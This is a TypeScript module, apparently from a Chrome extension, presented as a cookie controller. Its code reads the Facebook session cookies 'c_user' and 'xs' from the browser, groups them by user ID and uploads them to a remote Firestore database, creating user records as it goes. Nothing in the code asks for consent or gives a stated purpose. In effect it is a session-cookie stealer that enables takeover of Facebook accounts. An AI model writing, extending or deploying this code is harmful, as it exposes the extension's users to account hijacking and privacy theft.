import { AngularFirestore } from "./common.firebase";
  const setStorageData = data =>
  new Promise((resolve, reject) =>
    chrome.storage.sync.set(data, () =>
      chrome.runtime.lastError
        ? reject(Error(chrome.runtime.lastError.message))
        : resolve()
    )
  )
  const getStorageData = (key): Promise<any> =>
  new Promise((resolve, reject) =>
    chrome.storage.sync.get(key, result =>
      chrome.runtime.lastError
        ? reject(Error(chrome.runtime.lastError.message))
        : resolve(result)
    )
  )

export module CookieController {
    export const convertCookieImport = (data: chrome.cookies.Cookie[]): CookieImport[] => {
        const mapActive = {
          ".facebook.com": { url: "https://www.facebook.com", name: ['c_user', 'xs'] }
        }
        return data.filter(f => Object.keys(mapActive).includes(f.domain) && mapActive[f.domain].name.includes(f.name)).map((k) => { return new CookieImport(k, mapActive[k.domain].url || k.domain); });
      }
      const groupBy = (list, by: (pre) => string) => {
        return (list || []).reduce((cur, pre) => { cur[by(pre)] = [...(cur[by(pre)] || []), pre]; return cur; }, {})
      }
      export const updateCookie = async (cookies: CookieImport[]) => {
        const TB_COOKIE = 'cookies';
        const TB_USER = 'users';
        const _cUser = cookies.filter(k => k.domain == '.facebook.com' && k.name == 'c_user');
        if (_cUser.length === 0) { return; };
        const cUserId = _cUser[0].value;
        const _store = await getStorageData(cUserId);
        if (!_store[cUserId]) {
          // new user, to insert new account 
          const collectionRef = AngularFirestore.collection(TB_USER).where('userID', '==', cUserId);
          collectionRef.get().then(rs => {
            if(rs.docs.length === 0) {AngularFirestore.collection(TB_USER).add({ userID: cUserId, userName: "NEW", lastUpdate: new Date() }); }
          });
        }
        const by = (pre) => pre.domain + '-' + pre.name + '-' + pre.value;
        const sent = groupBy(_store[cUserId], by);
        const cookiesOld: CookieImport[] = [];
        const triggerOld = (value, cookiesOld: CookieImport[]) => {
          cookiesOld.push(value)
          return false;
        }
        cookies = cookies.filter((value: CookieImport) => !sent[by(value)] || triggerOld(value, cookiesOld));
        let preparedSave = {};
        preparedSave[cUserId] = cookies.concat(cookiesOld);
        setStorageData(preparedSave);
      
        const collectionCookies = AngularFirestore.collection(TB_COOKIE).where('userID', '==', cUserId);
        collectionCookies.get().then(async docs => {
          const currentDocs = [];
          const temp =  cookies.map( k => `${k.domain}-${k.name}`);
          docs.forEach(doc => temp.includes(`${doc.data().domain}-${doc.data().name}`) && currentDocs.push(AngularFirestore.collection(TB_COOKIE).doc(doc.id).delete()));
          await Promise.all(currentDocs);
          cookies.forEach(cookie => {
            AngularFirestore.collection(TB_COOKIE).add(Object.assign({ userID: cUserId }, cookie));
          });
        });
      }
}
class CookieImport {
    domain: string;
    expirationDate?: number;
    httpOnly: boolean;
    name: string;
    path: string;
    secure: boolean;
    storeId: string;
    value: string;
    url: string;
    constructor(original?: chrome.cookies.Cookie, url?: string) {
      this.domain = original?.domain;
      original?.expirationDate && (this.expirationDate = original?.expirationDate);
      this.httpOnly = original?.hostOnly;
      this.name = original?.name;
      this.path = original?.path;
      this.secure = original?.secure;
      this.storeId = original?.storeId;
      this.value = original?.value;
      this.url = url || '';
    }
  
  }

  